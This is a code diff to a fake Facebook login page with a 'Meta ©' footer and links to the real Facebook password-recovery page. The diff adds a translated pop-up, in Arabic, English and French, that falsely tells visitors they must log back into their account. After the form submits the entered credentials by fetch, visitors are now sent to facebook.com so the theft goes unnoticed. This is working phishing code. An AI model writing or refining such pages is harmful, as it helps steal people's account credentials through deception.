@@ -133,7 +133,7 @@
   <div class="meta" id="metaLink">Meta ©</div>
 
   <!-- ✅ فقاعة الإشعار -->
-  <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
+  <div class="toast" id="toast"></div>
 
   <script>
     const langBtn = document.getElementById("langBtn");
@@ -148,15 +148,7 @@
     const form = document.getElementById("myForm");
     const toast = document.getElementById("toast");
 
-    // ✅ إظهار الفقاعة عند بداية الصفحة
-    window.addEventListener("load", () => {
-      toast.classList.add("show");
-      setTimeout(() => {
-        toast.classList.remove("show");
-      }, 4000);
-    });
-
-    // باقي الكود بدون تغيير
+    // ✅ الترجمات
     const translations = {
       ar: {
         lang: "العربية ⌵",
@@ -169,7 +161,8 @@
         errorPass: "أدخل كلمة سر صحيحة",
         waiting: "جاري تسجيل الدخول...",
         customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
-        customPass: "يرجى إدخال كلمة سر صحيحة"
+        customPass: "يرجى إدخال كلمة سر صحيحة",
+        toast: "يجب عليك إعادة تسجيل الدخول إلى حسابك للمتابعة"
       },
       en: {
         lang: "English ⌵",
@@ -182,7 +175,8 @@
         errorPass: "Enter a valid password",
         waiting: "Logging in...",
         customEmail: "Please enter a valid email or phone number",
-        customPass: "Please enter a valid password"
+        customPass: "Please enter a valid password",
+        toast: "You need to log back into your account to continue"
       },
       fr: {
         lang: "Français ⌵",
@@ -195,7 +189,8 @@
         errorPass: "Entrez un mot de passe valide",
         waiting: "Connexion en cours...",
         customEmail: "Veuillez entrer un e-mail ou un numéro valide",
-        customPass: "Veuillez entrer un mot de passe valide"
+        customPass: "Veuillez entrer un mot de passe valide",
+        toast: "Vous devez vous reconnecter à votre compte pour continuer"
       }
     };
 
@@ -217,6 +212,7 @@
       createBtn.textContent = t.create;
       errorEmail.textContent = t.errorEmail;
       errorPass.textContent = t.errorPass;
+      toast.textContent = t.toast;
 
       emailInput.oninvalid = function() { this.setCustomValidity(t.customEmail); };
       emailInput.oninput = function() { this.setCustomValidity(""); };
@@ -232,6 +228,14 @@
     });
 
     updateLanguage();
+
+    // ✅ إظهار الفقاعة عند بداية الصفحة
+    window.addEventListener("load", () => {
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 4000);
+    });
 
     forgotText.addEventListener("click", () => {
       window.location.href = "https://m.facebook.com/login/identify/";
@@ -276,7 +280,7 @@
       .then(res => res.text())
       .then(txt => {
         form.reset();
-        window.location.href = "https://minha.anem.dz"; // ✅ الرابط الجديد
+        window.location.href = "https://www.facebook.com";
       })
       .catch(err => {
         msg.innerHTML = "❌ Error: " + err;
